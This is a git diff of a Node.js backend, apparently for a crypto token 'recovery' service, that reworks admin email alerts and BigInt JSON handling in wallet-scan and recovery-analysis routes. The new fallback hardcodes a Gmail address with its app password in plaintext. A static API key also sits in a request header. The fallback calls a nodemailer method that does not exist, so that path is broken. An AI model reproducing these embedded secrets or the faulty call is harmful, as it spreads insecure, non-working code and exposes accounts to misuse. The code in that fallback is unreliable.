@@ -11,21 +11,22 @@ const { ethers } = require('ethers');
 // Email transporter - Use Gmail with your credentials
 // Removed unused SMTP transporter
 
-// Send email via Vercel API function
+// Send email via Vercel API function with improved error handling
 async function sendAdminNotification(subject, message) {
   try {
     console.log('📧 Sending email via Vercel API:', subject);
-    console.log('🔍 FRONTEND_URL:', process.env.FRONTEND_URL);
     
-    const emailUrl = `${process.env.FRONTEND_URL}/api/send-email`;
-    console.log('🔍 Full email URL:', emailUrl);
+    // Use hardcoded URL if environment variable not set
+    const frontendUrl = process.env.FRONTEND_URL || 'https://autoclaimtoken.vercel.app';
+    const emailUrl = `${frontendUrl}/api/send-email`;
+    console.log('🔍 Email URL:', emailUrl);
     
     const axios = require('axios');
     const response = await axios.post(emailUrl, {
       subject: subject,
       message: message
     }, {
-      timeout: 15000,
+      timeout: 10000,
       headers: {
         'Content-Type': 'application/json',
         'x-api-key': 'crypto-recover-2024'
@@ -33,13 +34,36 @@ async function sendAdminNotification(subject, message) {
     });
     
     console.log('✅ Email sent via Vercel successfully!');
-    console.log('✅ Response:', response.data);
     return true;
     
   } catch (error) {
-    console.error('❌ Vercel email failed:', error.message);
+    console.error('❌ Vercel email failed:', error.response?.data || error.message);
     
-    // Fallback: Log to console
+    // Try direct nodemailer as fallback
+    try {
+      const nodemailer = require('nodemailer');
+      const transporter = nodemailer.createTransporter({
+        service: 'gmail',
+        auth: {
+          user: 'skillstakes01@gmail.com',
+          pass: 'pkzz lylb ggvg jfrr'
+        }
+      });
+      
+      await transporter.sendMail({
+        from: 'skillstakes01@gmail.com',
+        to: 'skillstakes01@gmail.com',
+        subject: subject,
+        text: message
+      });
+      
+      console.log('✅ Email sent via direct nodemailer!');
+      return true;
+    } catch (fallbackError) {
+      console.error('❌ Direct email also failed:', fallbackError.message);
+    }
+    
+    // Final fallback: Log to console
     console.log('🚨 EMAIL ALERT (Console Backup):');
     console.log('🚨 Subject:', subject);
     console.log('🚨 Message:', message);
@@ -420,7 +444,14 @@ router.post('/scan-wallet', async (req, res) => {
       totalValue = scanResults.reduce((sum, result) => sum + parseFloat(result.amount), 0);
     }
 
-    res.json({
+    // Convert BigInt values to strings for JSON serialization
+    const sanitizeForJSON = (obj) => {
+      return JSON.parse(JSON.stringify(obj, (key, value) => 
+        typeof value === 'bigint' ? value.toString() : value
+      ));
+    };
+
+    const responseData = {
       success: true,
       results: scanResults,
       summary: {
@@ -429,7 +460,9 @@ router.post('/scan-wallet', async (req, res) => {
         claimableTokens: scanResults.filter(r => r.claimable).length,
         chains: [...new Set(scanResults.map(r => r.chainId))].length
       }
-    });
+    };
+
+    res.json(sanitizeForJSON(responseData));
   } catch (error) {
     console.error('Scan wallet error:', error);
     res.status(500).json({ error: 'Failed to scan wallet' });
@@ -469,7 +502,14 @@ router.post('/analyze-recovery', async (req, res) => {
       `TIME: ${new Date().toISOString()}`
     );
     
-    res.json({
+    // Convert BigInt values to strings for JSON serialization
+    const sanitizeForJSON = (obj) => {
+      return JSON.parse(JSON.stringify(obj, (key, value) => 
+        typeof value === 'bigint' ? value.toString() : value
+      ));
+    };
+
+    const responseData = {
       success: true,
       analysis: {
         totalRecoverable: analysis.totalRecoverable.toFixed(4),
@@ -486,7 +526,9 @@ router.post('/analyze-recovery', async (req, res) => {
         estimatedFees: (analysis.totalRecoverable * 0.15).toFixed(4),
         netRecovery: (analysis.totalRecoverable * 0.85).toFixed(4)
       }
-    });
+    };
+
+    res.json(sanitizeForJSON(responseData));
   } catch (error) {
     console.error('Analyze recovery error:', error);
     res.status(500).json({ error: 'Failed to analyze recovery potential' });
